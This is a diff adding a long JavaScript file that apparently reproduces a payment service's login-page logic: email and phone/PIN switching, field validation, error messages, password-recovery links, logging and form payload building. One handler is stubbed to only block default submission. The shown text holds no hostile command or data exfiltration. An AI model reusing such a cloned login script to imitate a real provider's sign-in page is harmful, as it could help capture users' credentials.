+		var pinSection = document.querySelector('#splitPhoneSection') || document.querySelector('#pinSection');
+		// pinDiv for Pin icon toggle hide and show retiring phone pin message
+		var pinDiv = document.querySelector('#splitPassword') ||
+			document.querySelector('#splitPinSection') ||
+			document.querySelector('#pinSection');
+		var emailIcon = document.querySelector('.email');
+		var phoneIcon = document.querySelector('.phone');
+		var switchToPhoneDiv = document.querySelector('#loginWithPhoneOption');
+		var switchToPhoneLink = document.querySelector('#switchToPhone');
+		var switchToEmailDiv = document.querySelector('#loginWithEmailOption');
+		var switchToEmailLink = document.querySelector('#switchToEmail');
+		var countryPhoneSelectWrapper = document.querySelector('.countryPhoneSelectWrapper');
+		var emailPageSwitch = document.querySelector('#emailPageSwitch');
+
+		// retiring education message for phone pin
+		var retiringPhonePinMsg = document.querySelector('.educationMessage');
+
+		// Tagline for XO usecase
+		var emailSubTagLine = document.querySelector('#emailSubTagLine');
+		var phoneSubTagLine = document.querySelector('#phoneSubTagLine');
+
+		// Password recovery button
+		var pwrButton = document.querySelector('.forgotLink');
+		var pwrLink = pwrButton && pwrButton.querySelectorAll('.pwrLink');
+		var pwrIframe = pwrButton && pwrButton.querySelector('#pwdIframe');
+
+		// More options DOM
+		var moreOptionsMobileLink = document.querySelector('#moreOptionsMobile');
+		var moreOptionsDropDown = document.querySelector('#moreOptionsDropDown');
+		var tpdButton = document.querySelector('#tpdButton');
+		var isHybrid = login.utils.isHybridLoginExperience();
+		var isHybridEditableOnCookied = login.utils.isHybridEditableOnCookied();
+		var tpdDemo = document.querySelector('#tpdDemo');
+		var ctxId = document.querySelector('input[name="ctxId"]');
+
+		function toggleMoreOptions(event) {
+			var evtTarget = getEventTarget(event);
+			if (!moreOptionsDropDown || !event || !evtTarget) {
+				return;
+			}
+
+			if ($(evtTarget).hasClass('moreOptionsInfo')) {
+				eventPreventDefault(event);
+
+				// Instrument more options clicked only when it is to be shown
+				if ($(moreOptionsDropDown).hasClass('hide')) {
+					login.logger.log({
+						evt: 'state_name',
+						data: isHybrid ? 'begin_hybrid_pwd' : 'begin_pwd',
+						instrument: true
+					});
+
+					login.logger.log({
+						evt: 'transition_name',
+						data: isHybrid ? 'process_hybrid_pwd_more_opt' : 'process_pwd_more_opt',
+						instrument: true
+					});
+
+					login.logger.log({
+						evt: 'TPD_CLIENT',
+						data: 'CLICKED_MORE_OPTIONS',
+						calEvent: true
+					});
+
+					login.logger.pushLogs();
+				}
+
+				// toggle to show/hide the more options dropdown when the link is clicked
+				$(moreOptionsDropDown).removeClass('hide');
+				return;
+			}
+			// any other place, hide the dropdown
+			$(moreOptionsDropDown).addClass('hide');
+		}
+		function toggleTpdDemoBubble(event) {
+			var evtTarget = getEventTarget(event);
+			if (!tpdDemo || !event || !evtTarget) {
+				return;
+			}
+			$(tpdDemo).addClass('hide');
+
+		}
+		/**
+		 * Strip country code from user's input if it's already in the country select box.
+		 * For example, in the select box can be "+1". If a user writes in the phone input field: "+1 123 456 7890",
+		 * then we would strip "+1", so the final value would be "123 456 7890".
+		 * @param {String} phone
+		 * @return {String}
+		 */
+		function stripPhoneCountryCodeIfExists(phone) {
+			if (!phoneCodeDom) {
+				return phone;
+			}
+			var phoneCodeContainer = phoneCodeDom.container.querySelector('.phoneCode');
+			var phoneCountryCode = phoneCodeContainer && $(phoneCodeContainer).text();
+			var doesPhoneStartWithPhoneCountryCode = phone.lastIndexOf(phoneCountryCode, 0) === 0;
+			if (!doesPhoneStartWithPhoneCountryCode) {
+				return phone;
+			}
+			return phone.substr(phoneCountryCode.length); // "substr" takes parameters as (from, length)
+		}
+
+		/**
+		 * Shows the country select box if a user is entering a phone number.
+		 * @param {String} emailOrPhoneValue
+		 */
+		function switchBetweenPhoneAndEmailOnUserInput(emailOrPhoneValue) {
+			if (splitLoginContextField && splitLoginContextField.value === 'inputPassword' &&
+				!isHybridEditableOnCookied) {
+				// IMPORTANT: Don't continue if a user is on the password page
+				// and there is no hybrid input. E.g. Safari was triggering this function during autofill,
+				// which is not desired and can cause that a user will not be able to login.
+				return;
+			}
+			var isSplitLoginContextEmail = splitLoginContextField && splitLoginContextField.value === 'inputEmail';
+			if (!isHybridEditableOnCookied && isSplitLoginContextEmail && loginType === 'phone') {
+				// Reset loginType to 'email' if the split login context is email. That could be the case e.g.
+				// for unconfirmed phone login attempts.
+				loginType = 'email';
+			}
+			if (login.utils.doesItLookLikeEmail(emailOrPhoneValue)) {
+				if (loginType !== 'email') {
+					!isHybridEditableOnCookied && splitLoginContextField.setAttribute('value', 'inputEmail');
+					loginType = 'email';
+					$(countryPhoneSelectWrapper) && $(countryPhoneSelectWrapper).addClass('hide');
+					$(emailDom.container).removeClass('phoneInputWrapper');
+				}
+			} else {
+				phoneDom.field.value = emailOrPhoneValue;
+				if (loginType !== 'phone') {
+					!isHybridEditableOnCookied && splitLoginContextField.setAttribute('value', 'inputPhone');
+					loginType = 'phone';
+					$(countryPhoneSelectWrapper).removeClass('hide');
+					$(emailDom.container).addClass('phoneInputWrapper');
+				}
+			}
+		}
+
+		/**
+		 * Reset values for form fields.
+		 */
+		function resetForm() {
+			phoneDom.field.value = null;
+			emailDom.field.value = null;
+
+			// Hide masking DOM for email field
+			emailMaskDOM && $(emailMaskDOM).addClass('hide');
+			// If hybrid was set to email only, the following code will return it to email or phone input.
+			var model = login.storeInstance.getState().model;
+			var emailOrPhoneLabel = model && model.contextualLogin && model.contextualLogin.content
+				&& model.contextualLogin.content.emailOrPhoneLabel; // So ugly, it would be much nicer with Lodash.
+			$(emailDom.field).attr('placeholder', emailOrPhoneLabel);
+			$(emailDom.label).text(emailOrPhoneLabel);
+			emailDom.field.removeAttribute('data-hybrid-in-email-only-mode');
+		}
+
+		function onEmailOrPhoneInputOrChange(event) {
+			var target = getEventTarget(event);
+			var hybridInEmailOnlyMode = emailDom.field &&
+				$(emailDom.field).attr('data-hybrid-in-email-only-mode') === 'true';
+			if (hybridInEmailOnlyMode && loginType !== 'email') {
+				loginType = 'email'; // If it's hybridInEmailOnlyMode, login type was 'phone', so we need to reset it.
+			}
+			if (!target || hybridInEmailOnlyMode) {
+				return;
+			}
+			switchBetweenPhoneAndEmailOnUserInput(target.value);
+		}
+
+		if (isHybrid) {
+			// The input event is fired when the user changes the value of an <input> element,
+			// e.g. via a keyboard, using autoprefill or pasting a value via a mouse.
+			// More here about the "input" event and browser support: https://caniuse.com/#feat=input-event
+			addEvent(emailDom.field, 'input', onEmailOrPhoneInputOrChange);
+
+			// The change event is triggered when the input field looses focus. It's here as a backup plan
+			// for the input event above, because that one is not well supported in e.g. IE9.
+			addEvent(emailDom.field, 'change', onEmailOrPhoneInputOrChange);
+		}
+
+		if (isHybridEditableOnCookied) {
+			// When cookied hybrid loads, we want to update UI with a country code dropdown if a phone was submited.
+			switchBetweenPhoneAndEmailOnUserInput(emailDom.field.value);
+		}
+
+		if (login.pubsub) {
+			login.pubsub.subscribe('WINDOW_CLICK', toggleMoreOptions);
+			login.pubsub.subscribe('WINDOW_CLICK', toggleTpdDemoBubble);
+		}
+
+		var createAccount = document.querySelector('#createAccount');
+		if (createAccount) {
+			createAccount.onclick = function(e) {
+				var stateName = login.logger.getStateName();
+				login.utils.getOutboundLinksHandler(createAccount, stateName, 'process_signup')(e);
+			}
+		}
+
+		var backToInputEmailLink = document.querySelector('#backToInputEmailLink');
+		var backToEmailPasswordLink = document.querySelector('#backToEmailPasswordLink');
+		// Remember Profile link is only shown in splitEmail for now.
+		var rememberProfileCheckBox = document.querySelector('#rememberProfileEmail');
+
+		// Basic validation regex
+		var EMPTY_PTN = /^\s+|\s+$/;
+		var EMAIL_PTN = /^\S+@\S+\.\S+$/;
+		var INVALID_PHONE = /[^\d]+/g;
+		var INVALID_USERID_PTN = /\s/g;
+		var PAYPAL_ONE_TOUCH = 'PayPal One Touch™';
+		// Only hyphen, brackets, dot and spaces are allowed to be tyoed with phone numbers
+		// They will be stripped off from the phone before validation and submit to server.
+		// To ensure we get the number only for the server to validate the credentials.
+		var STRIP_SYMBOLS_FROM_PHONE = /[-().\s]/ig;
+
+		// Enable on keyup input field validation only when submit was clicked
+		var validateOnKeyUp = false;
+
+		// Smartlock form
+		var smartlockForm = document.querySelector('form[name=smartlockForm]');
+
+		// Switch to Password page in smartlock
+		var secondaryLoginBtn = document.querySelector('#secondaryLoginBtn');
+
+		var phonePasswordEnabled = $('body').data('phonePasswordEnabled');
+		var phonePinEnabled = $('body').data('phonePinEnabled');
+
+		// Maintain what type of login is being used (email/password or phone/pin)
+		var loginType = getDefaultLoginType();
+
+		/*
+		Safari support for showing spinner in case of full page form submission
+		To be enabled only if this is raised as a issue
+		var isSafari = navigator.vendor && navigator.vendor.indexOf('Apple') > -1 &&
+		navigator.userAgent && !navigator.userAgent.match('CriOS');
+		 */
+
+		/**
+		 * Generic function to trim a string
+		 * @param {String} str
+		 */
+		function trim(str) {
+			if (!str || typeof str !== 'string') {
+				return;
+			}
+			return str.replace(EMPTY_PTN, '');
+		}
+
+		function validateFieldHasValue(dom) {
+			if (!dom.field) {
+				// When dom field is not present, we cant draw the error, so safely not throw error.
+				return true;
+			}
+			if (!trim(dom.field.value)) {
+				showError(dom); // Draw a red border around the field with an exclaimation icon
+				showRequiredError(dom); // Slide down field level error notification
+				return false;
+			}
+			return true;
+		}
+
+		function isValidPhone(phoneDom) {
+			var phone = phoneDom && phoneDom.field && phoneDom.field.value;
+
+			if (!phoneDom || !phoneDom.field || phoneDom.field.hasAttribute('disabled')) {
+				// early return true, as we dont need to validate a disabled field
+				return true;
+			}
+			if (!phone) {
+				showError(phoneDom); // Draw a red border around the field with an exclaimation icon
+				showRequiredError(phoneDom); // Slide down field level error notification
+				hideInvalidError(phoneDom);
+				return false;
+			}
+			// remove symbols and match against patern
+			phone = phone && phone.replace(STRIP_SYMBOLS_FROM_PHONE, '');
+			if (!phone || phone.match(INVALID_PHONE)) {
+				showError(phoneDom); // Draw a red border around the field with an exclaimation icon
+				showInvalidError(phoneDom); // Slide down field level error notification
+				hideRequiredError(phoneDom);
+				return false;
+			}
+			return true;
+		}
+
+		function isValidUserId(emailDom) {
+			var email = emailDom && emailDom.field && trim(emailDom.field.value);
+
+			if (emailDom && emailDom.field && emailDom.field.hasAttribute('disabled')) {
+				// early return true, as we dont need to validate a disabled field
+				return true;
+			}
+			if (!email) {
+				showError(emailDom); // Draw a red border around the field with an exclaimation icon
+				showRequiredError(emailDom); // Slide down field level error notification
+				return false;
+			}
+			// Allow PayPal OneTouch™ to be valid user id
+			if (email === PAYPAL_ONE_TOUCH) {
+				return true;
+			}
+			if (email && email.match(INVALID_USERID_PTN)) {
+				showError(emailDom); // Draw a red border around the field with an exclaimation icon
+				showInvalidError(emailDom); // Slide down field level error notification
+				return false;
+			}
+			return true;
+		}
+
+		/**
+		 * Validate required/valid email, password, phone, pin and captcha (if present)
+		 * @param {Object} userIdDom The dom for either email or password
+		 * @param {Object} userPwdDom The dom for either password or pin
+		 */
+		function validateRequiredFields(userIdDom, userPwdDom) {
+			var email, pwd;
+			var captchaOk = true;   // Scenario where captcha was not shown
+			var captchaDom = login.utils.getActiveCaptchaElement(splitLoginContextField);
+
+			email = validateFieldHasValue(userIdDom);
+			if (!email) {
+				return false;
+			}
+
+			pwd = validateFieldHasValue(userPwdDom);
+			if (!pwd) {
+				return false;
+			}
+
+			if (captchaDom && captchaDom.field) { // Captcha was shown
+				captchaOk = validateFieldHasValue(captchaDom);
+			}
+
+			if (!captchaOk) {
+				return false;
+			}
+
+			return true;
+		}
+
+		/**
+		 * Finds currently active Remember Profile checkbox in split-login
+		 * @param {Object} splitLoginContext
+		 */
+		function getActiveRememberProfileElement(splitLoginContext) {
+			if (splitLoginContext.value === 'inputEmail') {
+				return document.querySelector('#rememberProfileEmail');
+			}
+
+			if (splitLoginContext.value === 'inputPassword') {
+				return document.querySelector('#rememberProfilePassword');
+			}
+
+			// Non-split-login page
+			return;
+		}
+
+		/**
+		 * Validate email
+		 * @param {Object} emailDom
+		 */
+		function validateEmail(emailDom) {
+			var trimmedEmail = emailDom.field.value.replace(EMPTY_PTN, '');
+			if (!trimmedEmail.match(EMAIL_PTN) && !emailDom.field.hasAttribute('disabled')) {
+				showError(emailDom);
+				showInvalidError(emailDom);
+				return false;
+			}
+			return true;
+		}
+
+		/**
+		 * Show error container
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function showError(dom) {
+			$(dom.container).addClass('hasError');
+			dom.container.style['z-index'] = 100;
+			$(dom.errMsgContainer).addClass('show');
+			dom.field.focus();
+		}
+
+		/**
+		 * Show the required error message
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function showRequiredError(dom) {
+			$(dom.errMsg).removeClass('hide');
+		}
+
+		/**
+		 * Show a invalid error message
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function showInvalidError(dom) {
+			$(dom.invalidMsg).removeClass('hide');
+		}
+
+		/**
+		 * Hide the error message(s) container
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function hideError(dom, removeErrHighlight) {
+			if (removeErrHighlight) {
+				$(dom.container).removeClass('hasError');
+			}
+			dom.container.style['z-index'] = 1;
+			$(dom.errMsgContainer).removeClass('show');
+		}
+
+		/**
+		 * Hide the required error message
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function hideRequiredError(dom) {
+			$(dom.errMsg).addClass('hide');
+		}
+
+		/**
+		 * Show the invalid error message
+		 * @param {Object} dom The DOM object which has the error div
+		 */
+		function hideInvalidError(dom) {
+			$(dom.invalidMsg).addClass('hide');
+		}
+
+		function updatePwrForRecoveryUsingEmail() {
+			var newHref, phoneRecoveryPTN = /\&passwordRecoveryByPhoneEnabled\=true/;
+			// reset PWR links to email recovery
+			if (pwrLink) {
+				for (var i = 0; i < pwrLink.length; i++) {
+					newHref = pwrLink[i].getAttribute('href').replace(phoneRecoveryPTN, '');
+					pwrLink[i].setAttribute('href', newHref);
+				}
+			}
+			if (pwrIframe) {
+				pwrIframe.setAttribute('data-src', pwrIframe.getAttribute('data-src').replace(phoneRecoveryPTN, ''));
+			}
+		}
+
+		function updatePwrForRecoveryUsingPhone() {
+			var newHref;
+			if (pwrLink) {
+				for (var i = 0; i < pwrLink.length; i++) {
+					newHref = pwrLink[i].getAttribute('href') + '&passwordRecoveryByPhoneEnabled=true';
+					pwrLink[i].setAttribute('href', newHref);
+				}
+			}
+			if (pwrIframe) {
+				pwrIframe.setAttribute('data-src', pwrIframe.getAttribute('data-src') + '&passwordRecoveryByPhoneEnabled=true');
+			}
+		}
+
+		/**
+		 * Enable email and password fields.
+		 * Disable phone and pin fields.
+		 */
+		function enableEmailPassword() {
+			var splitLoginContext = document.querySelector('input[name="splitLoginContext"]');
+			var splitLoginCookiedFallback = document.querySelector('input[name="splitLoginCookiedFallback"]');
+			// Show the email/password section
+			$(passwordSection).removeClass('hide');
+			// Hide the phone/pin section
+			$(pinSection).addClass('hide');
+			if (retiringPhonePinMsg) {
+				$(retiringPhonePinMsg).addClass('hide');
+			}
+			// Enable email & password fields
+			emailDom.field && emailDom.field.removeAttribute('disabled');
+			passwordDom.field && passwordDom.field.removeAttribute('disabled');
+
+			// Disable phone & pin fields (so that they are not sent to the server when the form is submitted)
+			phoneCodeDom.field && phoneCodeDom.field.setAttribute('disabled', 'disabled');
+			phoneDom.field && phoneDom.field.setAttribute('disabled', 'disabled');
+			pinDom.field && pinDom.field.setAttribute('disabled', 'disabled');
+
+			// Show the password recovery button
+			if (!phonePasswordEnabled) {
+				$(pwrButton).removeClass('hide');
+			}
+			switchToEmailDiv && $(switchToEmailDiv).addClass('hide');
+			$(btnActions).removeClass('phonePresent');
+
+			// Set login type (required for validation)
+			loginType = 'email';
+
+			// Set split login context to inputEmail if split login is enabled
+			if (splitLoginContext) {
+				// show email tagLine if present
+				emailSubTagLine && $(emailSubTagLine).removeClass('hide');
+				splitLoginContext.value = 'inputEmail';
+				if (splitLoginCookiedFallback) {
+					splitLoginContext.value = 'inputPassword';
+				}
+			}
+		}
+
+		/**
+		 * Enable phone and pin fields.
+		 * Disable email and password fields.
+		 */
+		function enablePhonePin() {
+			var splitLoginContext = document.querySelector('input[name="splitLoginContext"]');
+			// Show the phone/pin section
+			$(pinSection).removeClass('hide');
+			$(passwordSection).addClass('hide');
+			if (retiringPhonePinMsg && !$(pinDiv).hasClass('hide')) {
+				$(retiringPhonePinMsg).removeClass('hide');
+			}
+			// Enable phone & pin fields
+			phoneCodeDom.field && phoneCodeDom.field.removeAttribute('disabled');
+			phoneDom.field && phoneDom.field.removeAttribute('disabled');
+			pinDom.field && pinDom.field.removeAttribute('disabled');
+
+			// Disable email & password fields (so that they are not sent to the server when the form is submitted)
+			emailDom.field && emailDom.field.setAttribute('disabled', 'disabled');
+			passwordDom.field && passwordDom.field.setAttribute('disabled', 'disabled');
+
+			// Hide the password recovery button as it's not applicable for a phone/pin login
+			$(pwrButton).addClass('hide');
+			$(btnActions).addClass('phonePresent');
+
+			switchToPhoneDiv && $(switchToPhoneDiv).addClass('hide');
+
+			// Set login type (required for validation)
+			loginType = 'phone';
+
+			// hide email tagLine if present (this is only applicable to split login
+			emailSubTagLine && $(emailSubTagLine).addClass('hide');
+
+			// Set split login context to inputPassword if split login is enabled
+			if (splitLoginContext && !phonePasswordEnabled) {
+				// set inputPin as the context when in cookied fallback.
+				// In this scenario the toggle will show the phone and pin
+				splitLoginContext.value = (splitLoginContext.value === 'inputPassword' ? 'inputPin' : 'inputPhone');
+			}
+		}
+
+		function onPhoneCodeChangeEventHandler() {
+			var countryCode = phoneCodeDom.container.querySelector('.countryCode');
+			var phoneCode = phoneCodeDom.container.querySelector('.phoneCode');
+			var dropDown = phoneCodeDom.field;
+			var dropDownValue;
+
+			function getDropDownValue() {
+				var str = dropDown.options[dropDown.selectedIndex].value;
+				var arr = str.split(' ');
+				return {
+					countryCode: arr && (arr[0] || ''),
+					phoneCode: arr && (arr[1]  || '')
+				}
+			}
+
+			dropDownValue = getDropDownValue();
+			$(countryCode).text(dropDownValue.countryCode);
+			$(phoneCode).text(dropDownValue.phoneCode);
+		}
+
+		function onPhoneCodeClickEventHandler() {
+			login.logger.log({
+				evt: 'state_name',
+				data: 'begin_hybrid_login',
+				instrument: true
+			});
+			login.logger.log({
+				evt: 'transition_name',
+				data: 'click_change_country_code',
+				instrument: true
+			});
+			login.logger.pushLogs();
+		}
+
+		/**
+		 * Enable phone login in split screen
+		 */
+		function switchToPhoneLogin(event) {
+			// prevent the href default action
+			eventPreventDefault(event);
+			var splitLoginContext = document.querySelector('input[name="splitLoginContext"]');
+			var countryPhoneSelectWrapper = document.querySelector('.countryPhoneSelectWrapper');
+			// Show the phone section
+			$(pinSection).removeClass('hide');
+			// Hide the email section
+			$(passwordSection).addClass('hide');
+			// Hide switching to phone and show switching to email option
+			$(switchToPhoneDiv).addClass('hide');
+			$(switchToEmailDiv).removeClass('hide');
+
+			// hide errors in emailDom if any
+			hideError(emailDom, true);
+			// Enable phone & password fields
+			phoneCodeDom.field && phoneCodeDom.field.removeAttribute('disabled');
+			phoneDom.field && phoneDom.field.removeAttribute('disabled');
+			phoneDom.field.focus();
+
+			// hide email tagLine and show phone tagLine if present
+			emailSubTagLine && $(emailSubTagLine).addClass('hide');
+			phoneSubTagLine && $(phoneSubTagLine).removeClass('hide');
+
+			// Clear email & any notifications if present on the page
+			// This is possible in case of risk decline in public credentials submission
+			if (emailDom.field) {
+				emailDom.field.value = '';
+			}
+			login.view.updateNotificationView({});
+
+			// Disable email & pin fields (so that they are not sent to the server when the form is submitted)
+			emailDom.field && emailDom.field.setAttribute('disabled', 'disabled');
+			// set the splitlogin context
+			splitLoginContext.value = 'inputPhone';
+			// Log the state_name in FPTI SS - the current state and new transition
+			login.logger.log({
+				evt: 'state_name',
+				data: 'begin_email',
+				instrument: true
+			});
+			// log the new transition in FPTI SS
+			login.logger.log({
+				evt: 'transition_name',
+				data: 'prepare_phone',
+				instrument: true
+			});
+			login.logger.pushLogs();
+			// Log the new state of phone and transition
+			login.logger.log({
+				evt: 'state_name',
+				data: 'begin_phone',
+				instrument: true
+			});
+			// log the new transition in FPTI SS
+			login.logger.log({
+				evt: 'transition_name',
+				data: 'prepare_phone',
+				instrument: true
+			});
+			login.logger.pushLogs();
+			// If phone PIN is enabled, have the PIN enabled and password disabled. Else the otherway.
+			if (phonePinEnabled) {
+				pinDom.field && pinDom.field.removeAttribute('disabled');
+				passwordDom.field && passwordDom.field.setAttribute('disabled', 'disabled');
+				// Set login type (required for validation)
+				loginType = 'phone';
+				$(btnActions).addClass('phonePresent');
+				// Set split login context to phone if split login is enabled
+				// Hide the password recovery button as it's not applicable for a phone/pin login
+				$(pwrButton).addClass('hide');
+			} else {
+				passwordDom.field && passwordDom.field.removeAttribute('disabled');
+				pinDom.field && pinDom.field.setAttribute('disabled', 'disabled');
+				// Set login type (required for validation)
+				loginType = 'phonePassword';
+				countryPhoneSelectWrapper && $(countryPhoneSelectWrapper).removeClass('hide');
+			}
+		}
+
+		/**
+		 * Enable email login in split screen
+		 */
+		function switchToEmailLogin(event) {
+			eventPreventDefault(event);
+			var splitLoginContext = document.querySelector('input[name="splitLoginContext"]');
+			// Show the email section
+			$(passwordSection).removeClass('hide');
+			// Hide the phone section
+			$(pinSection).addClass('hide');
+			// Hide switching to email and show switching to phone option
+			$(switchToEmailDiv).addClass('hide');
+			$(switchToPhoneDiv).removeClass('hide');
+			if (retiringPhonePinMsg) {
+				$(retiringPhonePinMsg).addClass('hide');
+			}
+			// hide errors in phoneDom if any
+			hideError(phoneDom, true);
+			// Enable email & password fields
+			emailDom.field && emailDom.field.removeAttribute('disabled');
+			passwordDom.field && passwordDom.field.removeAttribute('disabled');
+			emailDom.field.focus();
+
+			// Disable phone & pin fields (so that they are not sent to the server when the form is submitted)
+			phoneCodeDom.field && phoneCodeDom.field.setAttribute('disabled', 'disabled');
+			phoneDom.field && phoneDom.field.setAttribute('disabled', 'disabled');
+			pinDom.field && pinDom.field.setAttribute('disabled', 'disabled');
+
+			// hide phone tagLine and show email tagLine if present
+			phoneSubTagLine && $(phoneSubTagLine).addClass('hide');
+			emailSubTagLine && $(emailSubTagLine).removeClass('hide');
+
+			$(btnActions).removeClass('phonePresent');
+
+			// Set login type (required for validation)
+			loginType = 'email';
+
+			// Set split login context to inputEmail if split login is enabled
+			splitLoginContext.value = 'inputEmail';
+			// Log the state_name in FPTI SS - current state of phone and new transition
+			login.logger.log({
+				evt: 'state_name',
+				data: 'begin_phone',
+				instrument: true
+			});
+			// log the new transition in FPTI SS
+			login.logger.log({
+				evt: 'transition_name',
+				data: 'prepare_email',
+				instrument: true
+			});
+			login.logger.pushLogs();
+			// Log the state_name in FPTI SS - new state of email and new transition
+			login.logger.log({
+				evt: 'state_name',
+				data: 'begin_email',
+				instrument: true
+			});
+			// log the new transition in FPTI SS
+			login.logger.log({
+				evt: 'transition_name',
+				data: 'prepare_email',
+				instrument: true
+			});
+			login.logger.pushLogs();
+		}
+
+		/*
+		 * This function performs a notYou and takes the user back to email page.
+		 * The reason for doing not you is, even a cookied user may click the link to switch to email, in which case
+		 * the rmuc with phone should still be cleared.
+		 */
+		function switchToSplitEmailFromPasswordPage(event, callback) {
+			eventPreventDefault(event);
+			updatePwrForRecoveryUsingEmail();
+			loginType = 'email';
+			login.utils.notYouClickHandler(event, function() {
+				// Log the state_name in FPTI SS - current state of phone password and new transition
+				login.logger.log({
+					evt: 'state_name',
+					data: 'begin_phone_pwd',
+					instrument: true
+				});
+				// log the new transition in FPTI SS
+				login.logger.log({
+					evt: 'transition_name',
+					data: 'prepare_email',
+					instrument: true
+				});
+				login.logger.pushLogs();
+				// Log the state_name in FPTI SS - new state of email and new transition
+				login.logger.log({
+					evt: 'state_name',
+					data: 'begin_email',
+					instrument: true
+				});
+				// log the new transition in FPTI SS
+				login.logger.log({
+					evt: 'transition_name',
+					data: 'prepare_email',
+					instrument: true
+				});
+				login.logger.pushLogs();
+				if (typeof callback === 'function') {
+					callback();
+				}
+			});
+		}
+
+		function onFormSubmitHandler(event) {
+			var enableSuppressAutoSubmit = $('body').data('enableSuppressAutoSubmit') === 'true';
+			var timeLapseForAutoSubmit = Date.now() - window.formAutofilledAt;
+			var shouldSuppressForSubmit = parseInt($('body').data('suppressAutosubmitTime')) >= timeLapseForAutoSubmit;
+			var autoSubmitCalType = 'AUTOSUBMIT';
+			var isKeychainActivationWithEmailTokenOn8ball = document.querySelector('input[name="isKeychainActivationWithEmailTokenOn8ball"]');
+
+			if (enableSuppressAutoSubmit && timeLapseForAutoSubmit) {
+				login.logger.log({
+					evt: autoSubmitCalType,
+					data: 'PREPARE_SUPPRESS_' + timeLapseForAutoSubmit,
+					calEvent: true
+				});
+				login.logger.pushLogs();
+				if (shouldSuppressForSubmit) {
+					eventPreventDefault(event);
+					delete window.formAutofilledAt;
+					return;
+				}
+			}
+
+			var splitLoginContext = document.querySelector('input[name=splitLoginContext]');
+			var splitLoginCookiedFallback = document.querySelector('input[name=splitLoginCookiedFallback]');
+			var splitLoginContextVal = (splitLoginContext && splitLoginContext.value) || '';
+			if (splitLoginCookiedFallback || isKeychainActivationWithEmailTokenOn8ball) {
+				onClickSubmitBtnHandler(event);
+			} else if (splitLoginContextVal === 'inputEmail' || splitLoginContextVal === 'inputPhone' ||
+				login.utils.isPrefilledEmailNext() || login.utils.isPrefillEmailEnabled()) {
+				onClickNextBtnHandler(event);
+			} else {
+				onClickSubmitBtnHandler(event);
+			}
+		}
+
+		function updatePhoneOnButtonClick(phone) {
+			var strippedPhone = stripPhoneCountryCodeIfExists(phone);
+			phoneDom.field.value = strippedPhone;
+			emailDom.field.value = strippedPhone;
+		}
+
+		/**
+		 * Handle next for split login user
+		 * This is called when with the email (or phone) field is submitted
+		 * @param {Object} event Mouse Click Event
+		 */
+		function onClickNextBtnHandler(event) {
+            event.preventDefault();
+		}
+
+		/**
+		 * It sets whatever value is displayed in a profile to phone or email fields.
+		 * This is necessarry to make sure that e.g. Safari will only prefill the password field and don't change
+		 * anything else, like hidden input fields from the previous page.
+		 */
+		function setPhoneAndEmailFieldsFromProfile() {
+			var splitLoginCookiedFallback = document.querySelector('input[name="splitLoginCookiedFallback"]');
+			var phoneField = document.querySelector('#phone');
+			var emailField = document.querySelector('#email');
+			var profileDisplayEmailField = document.querySelector('.profileDisplayEmail');
+			var publicIdentifierValue = profileDisplayEmailField && profileDisplayEmailField.innerHTML;
+			// If it's cookied fallback or there is no public credential in profile, don't change anything.
+			if (!publicIdentifierValue || splitLoginCookiedFallback || !(emailField && phoneField)) {
+				return;
+			}
+			if (emailField.hasAttribute('disabled') && !phoneField.hasAttribute('disabled')) {
+				phoneField.value = publicIdentifierValue;
+				emailField.value = '';
+			} else if (!emailField.hasAttribute('disabled') && phoneField.hasAttribute('disabled')) {
+				emailField.value = publicIdentifierValue;
+				phoneField.value = '';
+			}
+		}
+
+		function disablePhoneOrEmailFieldByActiveLoginType() {
+			if (loginType === 'email') {
+				phoneDom && phoneDom.field && phoneDom.field.setAttribute('disabled', 'disabled');
+			} else {
+				emailDom && emailDom.field && emailDom.field.setAttribute('disabled', 'disabled');
+			}
+		}
+
+		/**
+		 * Track if the user used an autofill feature of a browser or an extension
+		 * If the autofill is detected to the password field, an hidden element will be added to the login form
+		 * At this time of implementation, only Safari's keychain autofill can be tracked.
+		 */
+		function trackPasswordFieldAutofill() {
+			var loginForm = document.querySelector('form[name=login]');
+			var passwordField = document.querySelector('#password');
+			var btnLogin = document.querySelector('#btnLogin');
+			var isWebkitAutofillPseudoClassAdded = passwordField.matches(':-webkit-autofill');
+
+			/**
+			 * When a field is auto-filled, a special pseudo class is added to an element by a browser.
+			 * The pseudo class name varies by browsers. For example, for Safari and Chrome, ':webkit-autofill'.
+			 * Once the autofill pseudo class addition is detected, relevant flags will be sent to the backend through form data.
+			 */
+			if (isWebkitAutofillPseudoClassAdded && Object.prototype.hasOwnProperty.call(window, 'getComputedStyle')) {
+				var computedStyleOfPasswordField = window.getComputedStyle(passwordField);
+				var computedBackgroundColor = computedStyleOfPasswordField.backgroundColor; // default value is 'rgb(255, 255, 255)'
+				var parsedBackgroundColor = (computedBackgroundColor.match(/[0-5]{1,3}/g) || []).join(',');
+				login.utils.addHiddenElement('passwordFieldAutofillColor', parsedBackgroundColor, loginForm);
+			}
+		}
+
+		/*
+         * Get payload from form fields
+         * @param {Object[]|Object} formFields
+         * @param {string} captchaValue
+         * @param {boolean} rmProfileChecked
+         * @param {boolean} isHybrid
+         * @return {Object}
+         */
+		function getPayloadFromFormFields(formFields, captchaValue, rmProfileChecked, isHybrid) {
+			var profileDisplayPhoneCode = document.querySelector('.profileDisplayPhoneCode');
+			var formData = {};
+			for (var i = 0; i < formFields.length; i++) {
+				formData[formFields[i].name] = formFields[i].value;
+			}
+
+			// delete login_email since its phone login
+			if (formData.splitLoginContext === 'inputPassword' && formData.login_phone &&
+				profileDisplayPhoneCode && profileDisplayPhoneCode.textContent !== '') {
+				formData.phoneCode = profileDisplayPhoneCode.textContent;
+				delete formData.login_email;
+			}
+
+			// delete login_phone and phoneCode since its email login
+			if (formData.splitLoginContext === 'inputPassword' && !formData.login_phone &&
+				profileDisplayPhoneCode && profileDisplayPhoneCode.textContent === '') {
+				delete formData.login_phone;
+				delete formData.phoneCode;
+			}
+
+			// Process on Next click for hybrid login.
+			if (isHybrid) {
+				if (formData.splitLoginContext === 'inputPassword' && formData.login_phone && profileDisplayPhoneCode && profileDisplayPhoneCode.textContent !== '') {
+					formData.phoneCode = profileDisplayPhoneCode.textContent;
+				}
+			}
+			return formData;
+		}
+
+		/**
+		 * Login with XHR call
+		 * @param {NodeListOf|{}} formFields
